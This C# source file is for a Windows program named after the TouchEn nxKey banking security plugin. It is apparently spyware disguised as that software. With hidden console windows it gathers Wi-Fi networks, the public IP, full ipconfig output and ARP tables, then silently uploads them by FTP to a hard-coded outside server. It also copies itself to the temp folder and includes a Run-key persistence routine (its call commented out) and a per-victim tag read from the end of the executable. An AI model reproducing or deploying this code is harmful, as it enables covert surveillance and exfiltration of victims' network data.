using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace TouchEnNxKey
{
    static class Program
    {

        
        private static int MAXBUFFSIZE = 1024;
        private static string sep = "\r\n\r\n\r\n---------------------------------------------------------------------\r\n\r\n\r\n";

        private static string magic = "TAG:";
        private static string Magic { get => magic; set => magic = value; }

        private static string tag = "";
        private static string Tag { get => tag; set => tag = value; }

        /// <summary>
        /// 해당 응용 프로그램의 주 진입점입니다.
        /// </summary>
        [STAThread]
        static void Main()
        {
            //정보 가져오기
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }

        public static void GetAllInformations()
        {
            string ExeFileName = System.Reflection.Assembly.GetEntryAssembly().Location;
            Tag = ReadTag(ExeFileName);
            Consistance(ExeFileName);
            //RegisterAutostart(ExeFileName);


            StringBuilder sb = new StringBuilder();
            sb.Append(sep);
            sb.Append(getWifiInfo());
            sb.Append(sep);
            sb.Append(getPublicIP());
            sb.Append(sep);
            sb.Append(getIpconfig_All());
            sb.Append(sep);
            sb.Append(getARP());
            sb.Append(sep);
            string info = sb.ToString();

            String timeStamp = GetTimestamp(DateTime.Now);
            string localPath = Path.GetTempPath();
            string fileName = Tag + "_" + timeStamp + ".txt";

            //text 인자를 파일로 생성
            using (StreamWriter output = new StreamWriter(localPath + fileName, false, System.Text.Encoding.UTF8))
            {
                output.WriteLine(info);
            }

            FtpUpload("ftp://ghostyak83.cafe24.com", "test1", "test1", localPath + fileName, fileName);


            
        }

        public static String GetTimestamp(DateTime value)
        {
            return value.ToString("yyyyMMdd_HHmmss");
        }


        static string runCommand(string command)
        {
            Process proc = new Process();
            proc.StartInfo.CreateNoWindow = true;
            proc.StartInfo.FileName = "cmd";

            proc.StartInfo.Arguments = "/C \"" + command + "\"";

            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.UseShellExecute = false;
            proc.Start();
            string output = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit();

            return output;
        }


        static void runCommand_async(string command)
        {
            Process proc = new Process();
            proc.StartInfo.CreateNoWindow = true;
            proc.StartInfo.FileName = "cmd";

            proc.StartInfo.Arguments = "/C \"" + command + "\"";

            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.UseShellExecute = false;
            proc.Start();
        }


        static string getWifiInfo()
        {
            string command = "netsh wlan show networks mode=bssid";
            string output = "Command : " + command + "\r\n";
            output += runCommand(command);
            return output;
        }


        static string getIpconfig_All()
        {
            string command = "ipconfig /all";
            string output = "Command : " + command + "\r\n";
            output += runCommand(command);
            return output;
        }


        static string getARP()
        {
            string command = "arp -a";
            string output = "Command : " + command + "\r\n";
            output += runCommand(command);
            return output;
        }


        static string getPublicIP()
        {
            string command = "nslookup myip.opendns.com resolver1.opendns.com";
            string output = "Command : " + command + "\r\n" + "\r\n";
            output += runCommand(command);
            return output;

        }


        static void FtpUpload(string ftpServer, string id, string password, string localFilePath, string remoteFilePath)
        {
            try
            {

                FtpWebRequest requestFTPUploader = (FtpWebRequest)WebRequest.Create(ftpServer + "/" + remoteFilePath);

                requestFTPUploader.Credentials = new NetworkCredential(id, password);
                requestFTPUploader.Method = WebRequestMethods.Ftp.UploadFile;

                FileInfo fileInfo = new FileInfo(localFilePath);
                FileStream fileStream = fileInfo.OpenRead();

                int bufferLength = 2048;
                byte[] buffer = new byte[bufferLength];

                Stream uploadStream = requestFTPUploader.GetRequestStream();
                int contentLength = fileStream.Read(buffer, 0, bufferLength);

                while (contentLength != 0)
                {
                    uploadStream.Write(buffer, 0, contentLength);
                    contentLength = fileStream.Read(buffer, 0, bufferLength);
                }

                uploadStream.Close();
                fileStream.Close();

                requestFTPUploader = null;
            }
            catch(Exception)
            {
            }
        }

        static void FtpDownload(string ftpServer, string id, string password, string remoteFileFullPath, string localFileFullPath)
        {
            string localPath = Path.GetDirectoryName(localFileFullPath);
            string fileName = Path.GetFullPath(localFileFullPath);
            FtpWebRequest requestFileDownload = (FtpWebRequest)WebRequest.Create(ftpServer + "/" + remoteFileFullPath);

            requestFileDownload.Credentials = new NetworkCredential(id, password);
            requestFileDownload.Method = WebRequestMethods.Ftp.DownloadFile;

            FtpWebResponse responseFileDownload =
            (FtpWebResponse)requestFileDownload.GetResponse();

            Stream responseStream = responseFileDownload.GetResponseStream();
            FileStream writeStream = new FileStream(localPath + fileName, FileMode.Create);

            int Length = 2048;
            Byte[] buffer = new Byte[Length];
            int bytesRead = responseStream.Read(buffer, 0, Length);

            while (bytesRead > 0)
            {
                writeStream.Write(buffer, 0, bytesRead);
                bytesRead = responseStream.Read(buffer, 0, Length);
            }

            responseStream.Close();
            writeStream.Close();

            requestFileDownload = null;
            responseFileDownload = null;
        }


        static void WriteTag(string filename, string tag)
        {
            using (var fileStream = new FileStream(filename, FileMode.Append, FileAccess.Write, FileShare.None))
            using (var bw = new BinaryWriter(fileStream))
            {
                byte[] data = new byte[MAXBUFFSIZE];
                //byte[] aa = System.Text.Encoding.UTF8.GetBytes(Magic + tag);
                byte[] magicTag = System.Text.Encoding.ASCII.GetBytes(Magic + tag);
                if (magicTag.Length > data.Length)
                    throw new Exception("태그 사이즈가 너무 깁니다. Magic + tag 사이즈는 " + MAXBUFFSIZE + " 이내여야 합니다.");

                magicTag.CopyTo(data, 0);

                bw.Write(data);
            }
        }

        static string ReadTag(string filename)
        {
            string tag = ""; //TAG:문자열

            try
            {
                using (var br = new BinaryReader(File.Open(filename, FileMode.Open, FileAccess.Read)))
                {
                    int length = (int)br.BaseStream.Length;
                    if (length <= MAXBUFFSIZE)
                        throw new Exception("파일 사이즈가 1024보다 작습니다.");

                    int offset = length - MAXBUFFSIZE; //파일 끝에서 1024 만큼 읽을꺼임
                    br.BaseStream.Seek(offset, SeekOrigin.Begin);

                    byte[] data = br.ReadBytes(MAXBUFFSIZE);
                    int end = 0;
                    for (int i = 0; data[i] != 0; i++)
                    {
                        end = i + 1;
                    }
                    tag = System.Text.Encoding.UTF8.GetString(data, 0, end);
                }

                if (tag.IndexOf(Magic) == -1)
                    return "";
            }catch(Exception)
            {

            }

            return tag.Replace(Magic, "");
        }

        static void Consistance(string fullpath)
        {
            string tempPath = Path.GetTempPath();
            string newFileName = Path.GetFileName(fullpath);
            try
            {
                File.Copy(fullpath, tempPath + newFileName, true);
            }
            catch(Exception)
            {

            }
        }

        public static void RegisterAutostart(string fullpath)
        {
            string tempPath = Path.GetTempPath();
            string newFileName = Path.GetFileName(fullpath);
            string _FULLPATH = tempPath + newFileName;
            string _NAME = "BBangView";
            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                object valueObject = null;

                //레지스트리 등록
                valueObject = registryKey.GetValue(_NAME);
                if (valueObject == null)
                {
                    registryKey.SetValue(_NAME, _FULLPATH);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

    }
}
